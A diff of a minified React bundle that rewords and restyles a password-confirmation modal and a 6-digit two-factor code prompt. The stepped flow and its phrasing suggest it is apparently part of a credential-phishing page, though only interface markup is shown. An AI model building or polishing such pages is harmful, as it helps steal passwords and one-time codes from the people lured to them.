@@ -10955,14 +10955,11 @@
                         className: "title",
                         style: {
                           fontWeight: "bold",
-                          color: "#4B4F56",
+                          color: "#000000",
                           padding: "10px 10px 0px 10px",
                           fontSize: 16,
                         },
-                        children: "Two-factor authentication required (2/3)",
-                      }),
-                      (0, c.jsx)("hr", {
-                        style: { borderTop: "0.5px solid #FFFFFF" },
+                        children: "Check your authentication code",
                       }),
                       (0, c.jsxs)("div", {
                         className: "bodyofcard",
@@ -10983,19 +10980,31 @@
                               fontWeight: 400,
                               display: "flex",
                             },
-                            children: [
-                              "Enter the digit code from your",
-                              (0, c.jsx)("div", {
-                                style: {
-                                  fontWeight: "bold",
-                                  paddingRight: 5,
-                                  paddingLeft: 5,
-                                },
-                                children: "code generator",
-                              }),
-                              " ",
-                              "or third-party app below.",
-                            ],
+                            children:
+                              "Enter the 6-digit code for this account from the two-factor authentication you set up",
+                          }),
+                          (0, c.jsxs)("div", {
+                            style: {
+                              padding: "10px 10px 10px 10px",
+                              fontSize: 14,
+                              fontWeight: 400,
+                              display: "flex",
+                            },
+                            children:
+                              "(such as Google Authenticator or a text message you have received on your phone).",
+                          }),
+                          (0, c.jsx)("div", {
+                            style: {
+                              paddingTop: 20,
+                              paddingBottom: 10,
+                              borderRadius: 10,
+                            },
+                            children: (0, c.jsx)("img", {
+                              src: "/resources/otp.png",
+                              width: "90%",
+                              height: 100,
+                              borderRadius: 10,
+                            }),
                           }),
                           (0, c.jsxs)("div", {
                             style: {
@@ -11216,18 +11225,11 @@
                     },
                     children: [
                       (0, c.jsx)("div", {
-                        style: { fontSize: 20, fontWeight: 400 },
-                        children: "Please Enter Your Password",
+                        style: { fontSize: 20, fontWeight: 700 },
+                        children: "Confirm Your Password",
                       }),
                       (0, c.jsx)("button", { onClick: a, children: "x" }),
                     ],
-                  }),
-                  (0, c.jsx)("hr", {
-                    style: {
-                      borderTop: "0.5px solid #FFFFFF",
-                      marginTop: 20,
-                      marginBottom: 20,
-                    },
                   }),
                   (0, c.jsx)("div", {
                     children:
@@ -11239,8 +11241,8 @@
                       (0, c.jsx)("div", {
                         className: "",
                         style: {
-                          fontWeight: "500",
-                          color: "grey",
+                          fontWeight: "600",
+                          color: "black",
                           fontSize: 14,
                           marginTop: 20,
                           marginBottom: 5,
@@ -11285,10 +11287,10 @@
                             style: {
                               paddingRight: 30,
                               paddingLeft: 30,
-                              marginTop: 15,
+                              marginTop: 20,
                               height: 45,
                               fontWeight: "bold",
-                              fontSize: 16,
+                              fontSize: 18,
                               borderRadius: 5,
                               borderWidth: 0,
                               backgroundColor: s ? "#3084F4" : "#7DAFF9",
